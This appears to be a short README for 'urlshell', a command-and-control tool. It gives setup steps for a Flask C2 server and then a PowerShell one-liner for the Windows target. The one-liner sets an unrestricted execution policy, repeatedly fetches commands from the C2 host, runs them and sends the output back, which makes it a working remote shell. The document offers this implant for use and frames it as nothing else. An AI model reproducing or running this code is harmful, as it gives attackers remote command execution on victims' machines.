# Running urlshell
## On C2
```
pip install flask

python3 urlshell.py
```

## On windows
```
Set-ExecutionPolicy Unrestricted -Scope Process -Confirm:$false;$i="http://127.0.0.1:80";$l=@();while($true){$r = iwr $i/a.js;$b = iwr $i/b.js;$c = $r.Content;$b = $b.Content;if($l -contains $b){}else{$l += $b; $z=&$c;iwr $i/">"$z};Start-Sleep -Seconds 1;$z = ""} 
```
